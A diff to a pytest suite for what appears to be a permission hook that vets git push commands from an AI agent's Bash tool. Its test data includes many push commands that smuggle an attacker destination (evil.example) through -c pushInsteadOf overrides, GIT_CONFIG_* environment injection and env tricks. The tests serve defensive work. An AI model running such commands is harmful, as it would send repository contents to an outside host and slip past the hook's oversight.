@@ -1409,11 +1409,9 @@ def test_push_to_unverified_repository_requires_confirmation(merged_branch_repo,
 @pytest.mark.parametrize("command", [
 	"git -c remote.origin.url=https://github.com/other/repo push origin --delete feature/x",
 	"git -c remote.origin.pushurl=https://github.com/other/repo push origin :feature/x",
-	"git -c url.https://github.com/other/repo.insteadOf=https://github.com/o/r push origin HEAD:feature/x",
 	"git -cremote.origin.url=https://github.com/other/repo push origin --tags",
 	"git --config-env=remote.origin.url=REMOTE_URL push origin HEAD:feature/x",
 	"git --config-env remote.origin.url=REMOTE_URL push origin HEAD:feature/x",
-	"git -c user.name=bot push origin HEAD:feature/x",
 ])
 def test_per_command_config_push_asks_without_using_origin_prs(merged_branch_repo, monkeypatch, capsys, command: str) -> None:
 	repo, _ = merged_branch_repo
@@ -1426,14 +1424,25 @@ def test_per_command_config_push_asks_without_using_origin_prs(merged_branch_rep
 	assert "other/repo" not in output  # URLs may carry credentials; never print config values.
 
 
+@pytest.mark.parametrize(("command", "expected_slugs"), [
+	("git -c url.https://github.com/other/repo.insteadOf=https://github.com/o/r push origin HEAD:feature/x", ["other/repo"]),
+	("git -c user.name=bot push origin HEAD:feature/x", ["o/r"]),
+	("GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://github.com/other/repo git push origin HEAD:feature/x", ["o/r", "other/repo"]),
+	("env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://github.com/other/repo git push origin HEAD:feature/x", ["o/r", "other/repo"]),
+])
+def test_resolvable_git_config_uses_effective_destination(merged_branch_repo, monkeypatch, command: str, expected_slugs: list[str]) -> None:
+	repo, _ = merged_branch_repo
+	observed_slugs: list[str] = []
+	monkeypatch.setattr(guard, "_read_cache", lambda *args: None)
+	monkeypatch.setattr(guard, "_write_cache", lambda *args: None)
+	monkeypatch.setattr(guard, "query_pull_requests", lambda slug, *_: observed_slugs.append(slug) or [OPEN_PR])
+	assert guard.evaluate(_bash_payload(command) | {"cwd": str(repo)}) == (0, "")
+	assert observed_slugs == expected_slugs
+
+
 @pytest.mark.parametrize("command", [
-	"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://github.com/other/repo git push origin HEAD:feature/x",
 	"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://github.com/other/repo git push origin --tags",
-	"GIT_CONFIG_PARAMETERS='remote.origin.url=https://github.com/other/repo' git push origin HEAD:feature/x",
-	"GIT_CONFIG_GLOBAL=/tmp/other-config git push origin :feature/x",
 	"GIT_CONFIG_COUNT+=1 git push origin HEAD:feature/x",
-	"GIT_CONFIG=/tmp/other-config git push origin HEAD:feature/x",
-	"env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://github.com/other/repo git push origin HEAD:feature/x",
 	"/usr/bin/env -i GIT_CONFIG_GLOBAL=/tmp/other-config git push origin HEAD:feature/x",
 	"env -u GIT_CONFIG_GLOBAL git push origin HEAD:feature/x",
 	"env - git push origin HEAD:feature/x",
@@ -1452,6 +1461,26 @@ def test_environment_config_push_asks_without_using_origin_prs(merged_branch_rep
 	decision = json.loads(capsys.readouterr().out.splitlines()[-1])
 	assert decision["hookSpecificOutput"]["permissionDecision"] == "ask"
 	assert "other/repo" not in json.dumps(decision)
+
+
+@pytest.mark.parametrize("command", [
+	"GIT_CONFIG_PARAMETERS='remote.origin.url=https://github.com/other/repo' git push origin HEAD:feature/x",
+	"GIT_CONFIG=/tmp/other-config git push origin HEAD:feature/x",
+])
+def test_unreadable_git_config_fails_closed(merged_branch_repo, monkeypatch, command: str) -> None:
+	repo, _ = merged_branch_repo
+	monkeypatch.setattr(guard, "query_pull_requests", lambda *args: pytest.fail("invalid config must not reach PR lookup"))
+	code, message = guard.evaluate(_bash_payload(command) | {"cwd": str(repo)})
+	assert code == 2 and "could not verify the push destination" in message
+
+
+def test_missing_global_git_config_keeps_origin_for_deletion(merged_branch_repo, monkeypatch, capsys) -> None:
+	repo, _ = merged_branch_repo
+	monkeypatch.setattr(guard, "query_pull_requests", lambda *args: pytest.fail("deletion must not query PR history"))
+	assert guard.evaluate(_bash_payload(
+		"GIT_CONFIG_GLOBAL=/tmp/other-config git push origin :feature/x"
+	) | {"cwd": str(repo)}) == (0, "")
+	assert capsys.readouterr().out == ""
 
 
 @pytest.mark.parametrize("command", [
@@ -1558,8 +1587,6 @@ def test_matching_refspec_on_unverified_remote_does_not_check_origin(merged_bran
 
 @pytest.mark.parametrize("command", [
 	"git push https://github.com/other/repo :feature/x",
-	"git push --repo=https://github.com/other/repo :feature/x",
-	"git push --repo=https://github.com/other/repo -d feature/x",
 	"git push https://github.com/other/repo --delete feature/x",
 	"git push https://github.com/other/repo --tags",
 ])
@@ -1572,12 +1599,24 @@ def test_deletion_and_tag_only_pushes_to_other_repository_ask(merged_branch_repo
 	assert decision["hookSpecificOutput"]["permissionDecision"] == "ask"
 
 
-@pytest.mark.parametrize("remote", ["origin"])
-def test_deletion_on_origin_does_not_check_merged_pr(merged_branch_repo, monkeypatch, capsys, remote: str) -> None:
+@pytest.mark.parametrize("command", [
+	"git push --repo=https://github.com/other/repo :feature/x",
+	"git push --repo=https://github.com/other/repo -d feature/x",
+])
+def test_positional_repository_overrides_repo_option_and_blocks(merged_branch_repo, monkeypatch, command: str) -> None:
 	repo, _ = merged_branch_repo
-	monkeypatch.setattr(guard, "query_pull_requests", lambda *args: pytest.fail("deletions must not check PR history"))
+	monkeypatch.setattr(guard, "query_pull_requests", lambda *args: pytest.fail("invalid destination must not query PR history"))
+	code, message = guard.evaluate(_bash_payload(command) | {"cwd": str(repo)})
+	assert code == 2 and "could not verify the push destination" in message
+
+
+@pytest.mark.parametrize("remote", ["origin"])
+@pytest.mark.parametrize("args", [":feature/x", "--delete feature/x", "--tags", "refs/tags/v1:refs/tags/v1"])
+def test_deletion_on_origin_does_not_check_merged_pr(merged_branch_repo, monkeypatch, capsys, remote: str, args: str) -> None:
+	repo, _ = merged_branch_repo
+	monkeypatch.setattr(guard, "query_pull_requests", lambda *unused: pytest.fail("non-branch pushes must not check PR history"))
 	code, message = guard.evaluate({"tool_name": "Bash", "cwd": str(repo),
-		"tool_input": {"command": f"git push {remote} :feature/x"}})
+		"tool_input": {"command": f"git push {remote} {args}"}})
 	assert code == 0 and message == ""
 	assert "permissionDecision" not in capsys.readouterr().out
 
@@ -1952,6 +1991,12 @@ def test_empty_pushurl_is_not_treated_as_fetch_url(merged_branch_repo, monkeypat
 	"/usr/bin/env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil.example/.pushInsteadOf GIT_CONFIG_VALUE_0=https://github.com/o/ /usr/bin/git push origin HEAD:feature/x",
 	"git -c url.https://evil.example/.pushInsteadOf=https://github.com/o/ push https://github.com/o/r.git HEAD:feature/x",
 	"git -c remote.pushDefault=other push HEAD:feature/x",
+	"git -c url.https://evil.example/.pushInsteadOf=https://github.com/o/ push origin --tags",
+	"git -c url.https://evil.example/.pushInsteadOf=https://github.com/o/ push origin :feature/x",
+	"git -c url.https://evil.example/.pushInsteadOf=https://github.com/o/ push origin refs/tags/v1:refs/tags/v1",
+	"git -c url.https://evil.example/.pushInsteadOf=https://github.com/o/ push origin --delete feature/x",
+	"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil.example/.pushInsteadOf GIT_CONFIG_VALUE_0=https://github.com/o/ git push origin --tags",
+	"env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil.example/.pushInsteadOf GIT_CONFIG_VALUE_0=https://github.com/o/ git push origin :feature/x",
 ])
 def test_effective_non_github_destination_blocks_before_lookup(merged_branch_repo, monkeypatch, command: str) -> None:
 	repo, _ = merged_branch_repo
@@ -1959,6 +2004,17 @@ def test_effective_non_github_destination_blocks_before_lookup(merged_branch_rep
 	monkeypatch.setattr(guard, "query_pull_requests", lambda *args: pytest.fail("no PR lookup expected"))
 	code, message = guard.evaluate(_bash_payload(command) | {"cwd": str(repo)})
 	assert code == 2, message
+	assert "could not verify the push destination" in message
+	assert "evil.example" not in message
+
+
+def test_unresolved_branch_checks_explicit_push_destination(merged_branch_repo, monkeypatch) -> None:
+	repo, _ = merged_branch_repo
+	monkeypatch.setattr(guard, "query_pull_requests", lambda *args: pytest.fail("no PR lookup expected"))
+	code, message = guard.evaluate(_bash_payload(
+		"git push https://evil.example/o/r.git HEAD:$TARGET"
+	) | {"cwd": str(repo)})
+	assert code == 2
 	assert "could not verify the push destination" in message
 	assert "evil.example" not in message
 
@@ -2054,6 +2110,8 @@ def test_explicit_non_github_pushurl_is_not_rewritten(merged_branch_repo, monkey
 	"git remote set-url origin https://evil.example/o/r.git && git push origin HEAD:feature/x",
 	"env -i git push origin HEAD:feature/x",
 	"env -u GIT_CONFIG_COUNT git push origin HEAD:feature/x",
+	"git --config-env=remote.origin.url=REMOTE_URL push origin --tags",
+	"env -i git push origin --delete feature/x",
 	"/usr/bin/env -i /usr/bin/git push origin HEAD:feature/x",
 	"env -u GIT_CONFIG_COUNT /usr/bin/git push origin HEAD:feature/x",
 	"env -S 'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil.example/.pushInsteadOf GIT_CONFIG_VALUE_0=https://github.com/o/ git push origin HEAD:feature/x'",
